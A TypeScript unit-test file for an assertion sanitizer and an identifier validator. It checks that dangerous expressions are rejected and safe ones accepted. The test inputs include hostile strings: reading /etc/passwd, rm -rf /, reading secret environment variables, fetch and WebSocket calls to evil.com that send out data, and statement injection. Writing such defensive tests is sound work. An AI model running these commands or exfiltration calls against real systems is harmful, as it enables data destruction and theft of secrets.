import { describe, it } from "node:test";
import * as assert from "node:assert/strict";
import { validateAssertion, validateGeneratorKey } from "../utils/assertion-sanitizer";

describe("validateAssertion", () => {
  // --- Valid assertions ---

  it("should accept a simple comparison", () => {
    const result = validateAssertion("add(a, b) === add(b, a)");
    assert.deepEqual(result, { valid: true });
  });

  it("should accept Math.abs usage", () => {
    const result = validateAssertion("Math.abs(result - expected) < 0.01");
    assert.deepEqual(result, { valid: true });
  });

  it("should accept array length checks", () => {
    const result = validateAssertion("sort(arr).length === arr.length");
    assert.deepEqual(result, { valid: true });
  });

  it("should accept typeof checks", () => {
    const result = validateAssertion("typeof formatPrice(n) === 'string'");
    assert.deepEqual(result, { valid: true });
  });

  // --- Empty / too long ---

  it("should reject empty assertion", () => {
    const result = validateAssertion("");
    assert.equal(result.valid, false);
    assert.match((result as { reason: string }).reason, /empty/i);
  });

  it("should reject whitespace-only assertion", () => {
    const result = validateAssertion("   ");
    assert.equal(result.valid, false);
  });

  it("should reject assertion exceeding 500 chars", () => {
    const longAssertion = "a".repeat(501);
    const result = validateAssertion(longAssertion);
    assert.equal(result.valid, false);
    assert.match((result as { reason: string }).reason, /too long/i);
  });

  it("should accept assertion at exactly 500 chars", () => {
    const maxAssertion = "a".repeat(500);
    const result = validateAssertion(maxAssertion);
    assert.deepEqual(result, { valid: true });
  });

  // --- Dangerous patterns: Node.js require/import ---

  it("should reject require()", () => {
    const result = validateAssertion("require('fs').readFileSync('/etc/passwd')");
    assert.equal(result.valid, false);
    assert.match((result as { reason: string }).reason, /require/);
  });

  it("should reject dynamic import()", () => {
    const result = validateAssertion("import('child_process')");
    assert.equal(result.valid, false);
    assert.match((result as { reason: string }).reason, /import/);
  });

  // --- Dangerous patterns: eval / Function constructor ---

  it("should reject eval()", () => {
    const result = validateAssertion("eval('process.exit(1)')");
    assert.equal(result.valid, false);
  });

  it("should reject Function constructor", () => {
    const result = validateAssertion("Function('return process')()");
    assert.equal(result.valid, false);
  });

  it("should reject new Function()", () => {
    const result = validateAssertion("new Function('return 1')()");
    assert.equal(result.valid, false);
  });

  // --- Dangerous patterns: process / global access ---

  it("should reject process access", () => {
    const result = validateAssertion("process.env.SECRET");
    assert.equal(result.valid, false);
  });

  it("should reject global access", () => {
    const result = validateAssertion("global.constructor");
    assert.equal(result.valid, false);
  });

  it("should reject globalThis access", () => {
    const result = validateAssertion("globalThis.process");
    assert.equal(result.valid, false);
  });

  // --- Dangerous patterns: file system / network ---

  it("should reject __dirname", () => {
    const result = validateAssertion("__dirname + '/secrets'");
    assert.equal(result.valid, false);
  });

  it("should reject __filename", () => {
    const result = validateAssertion("__filename.length > 0");
    assert.equal(result.valid, false);
  });

  it("should reject fs. access", () => {
    const result = validateAssertion("fs.readFileSync('/etc/passwd')");
    assert.equal(result.valid, false);
  });

  it("should reject net. access", () => {
    const result = validateAssertion("net.createServer()");
    assert.equal(result.valid, false);
  });

  it("should reject http. access", () => {
    const result = validateAssertion("http.get('http://evil.com')");
    assert.equal(result.valid, false);
  });

  it("should reject os. access", () => {
    const result = validateAssertion("os.homedir()");
    assert.equal(result.valid, false);
  });

  // --- Dangerous patterns: child process ---

  it("should reject child_process", () => {
    const result = validateAssertion("child_process.exec('rm -rf /')");
    assert.equal(result.valid, false);
  });

  it("should reject execSync", () => {
    const result = validateAssertion("execSync('whoami')");
    assert.equal(result.valid, false);
  });

  it("should reject spawnSync", () => {
    const result = validateAssertion("spawnSync('ls', ['-la'])");
    assert.equal(result.valid, false);
  });

  // --- Dangerous patterns: network APIs ---

  it("should reject fetch()", () => {
    const result = validateAssertion("fetch('http://evil.com/exfil?data=' + secret)");
    assert.equal(result.valid, false);
  });

  it("should reject XMLHttpRequest", () => {
    const result = validateAssertion("new XMLHttpRequest()");
    assert.equal(result.valid, false);
  });

  it("should reject WebSocket", () => {
    const result = validateAssertion("new WebSocket('ws://evil.com')");
    assert.equal(result.valid, false);
  });

  // --- Dangerous patterns: async side effects ---

  it("should reject setTimeout", () => {
    const result = validateAssertion("setTimeout(() => {}, 0)");
    assert.equal(result.valid, false);
  });

  it("should reject setInterval", () => {
    const result = validateAssertion("setInterval(() => {}, 1000)");
    assert.equal(result.valid, false);
  });

  it("should reject Promise chains", () => {
    const result = validateAssertion("Promise.resolve().then(() => exfil())");
    assert.equal(result.valid, false);
  });

  // --- Dangerous patterns: template literals ---

  it("should reject template literals (backticks)", () => {
    const result = validateAssertion("`${process.env.SECRET}`");
    assert.equal(result.valid, false);
  });

  // --- Dangerous patterns: multi-statement injection ---

  it("should reject semicolon-separated statements", () => {
    const result = validateAssertion("true; process.exit(1)");
    assert.equal(result.valid, false);
  });

  it("should reject newlines (multi-statement via line break)", () => {
    const result = validateAssertion("true\nprocess.exit(1)");
    assert.equal(result.valid, false);
  });

  it("should reject Unicode line separators", () => {
    const result = validateAssertion("true\u2028malicious()");
    assert.equal(result.valid, false);
  });

  // --- Dangerous patterns: comments ---

  it("should reject single-line comments", () => {
    const result = validateAssertion("true // ignore rest");
    assert.equal(result.valid, false);
  });

  it("should reject block comments", () => {
    const result = validateAssertion("true /* swallow */ && false");
    assert.equal(result.valid, false);
  });

  // --- Edge cases: tricky bypasses that SHOULD be caught ---

  it("should reject require with extra spaces", () => {
    const result = validateAssertion("require  ('fs')");
    assert.equal(result.valid, false);
  });

  it("should reject eval with spaces", () => {
    const result = validateAssertion("eval  ('code')");
    assert.equal(result.valid, false);
  });

  // --- Edge cases: safe strings that look dangerous ---

  it("should accept 'process' as part of a longer word", () => {
    // "process" appears as a standalone word, so this IS blocked
    const result = validateAssertion("process.env.KEY");
    assert.equal(result.valid, false);
  });

  it("should accept 'processing' (contains 'process' but as substring of word)", () => {
    // \bprocess\b uses word boundary — "processing" should NOT match
    const result = validateAssertion("processing(data) > 0");
    assert.deepEqual(result, { valid: true });
  });

  it("should accept 'required' (contains 'require' but as different word)", () => {
    // \brequire\s*\( requires opening paren — "required" has no paren
    const result = validateAssertion("required === true");
    assert.deepEqual(result, { valid: true });
  });
});

describe("validateGeneratorKey", () => {
  it("should accept simple identifiers", () => {
    assert.equal(validateGeneratorKey("price"), true);
    assert.equal(validateGeneratorKey("a"), true);
    assert.equal(validateGeneratorKey("myVar123"), true);
  });

  it("should accept underscore/dollar prefixed identifiers", () => {
    assert.equal(validateGeneratorKey("_private"), true);
    assert.equal(validateGeneratorKey("$special"), true);
  });

  it("should reject empty string", () => {
    assert.equal(validateGeneratorKey(""), false);
  });

  it("should reject strings starting with digits", () => {
    assert.equal(validateGeneratorKey("123abc"), false);
  });

  it("should reject strings with spaces", () => {
    assert.equal(validateGeneratorKey("my var"), false);
  });

  it("should reject injection via special characters", () => {
    assert.equal(validateGeneratorKey("a; process.exit()"), false);
    assert.equal(validateGeneratorKey("a\nprocess"), false);
    assert.equal(validateGeneratorKey("a.b"), false);
    assert.equal(validateGeneratorKey("a[0]"), false);
  });
});
